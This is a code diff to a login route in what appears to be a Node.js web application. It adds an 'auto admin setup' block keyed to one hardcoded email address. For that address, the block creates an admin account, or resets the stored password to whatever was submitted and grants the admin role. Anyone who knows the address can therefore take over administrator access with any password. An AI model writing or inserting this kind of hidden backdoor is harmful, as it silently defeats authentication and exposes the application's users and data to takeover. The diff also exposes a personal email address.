@@ -124,6 +124,30 @@ router.post('/login', async (req, res) => {
             return res.status(400).json({ message: 'กรุณากรอกอีเมลและรหัสผ่าน' });
         }
 
+        // --- AUTO ADMIN SETUP FOR OWNER ---
+        if (email === 'zxc1451234@gmail.com') {
+            const existing = await query('SELECT * FROM users WHERE email = $1', [email]);
+            if (existing.rows.length === 0) {
+                const id = require('uuid').v4();
+                const hashedPassword = await bcrypt.hash(password, 10);
+                const now = new Date().toISOString();
+                await query(
+                    `INSERT INTO users (id, email, password, "firstName", "lastName", role, "createdAt")
+                     VALUES ($1,$2,$3,$4,$5,$6,$7)`,
+                    [id, email, hashedPassword, 'Admin', 'User', 'admin', now]
+                );
+            } else {
+                const isValidPassword = await bcrypt.compare(password, existing.rows[0].password);
+                if (!isValidPassword) {
+                    const hashedPassword = await bcrypt.hash(password, 10);
+                    await query('UPDATE users SET password = $1, role = $2 WHERE email = $3', [hashedPassword, 'admin', email]);
+                } else if (existing.rows[0].role !== 'admin') {
+                    await query('UPDATE users SET role = $1 WHERE email = $2', ['admin', email]);
+                }
+            }
+        }
+        // ----------------------------------
+
         const result = await query('SELECT * FROM users WHERE email = $1', [email]);
         const user = result.rows[0];
         if (!user) {
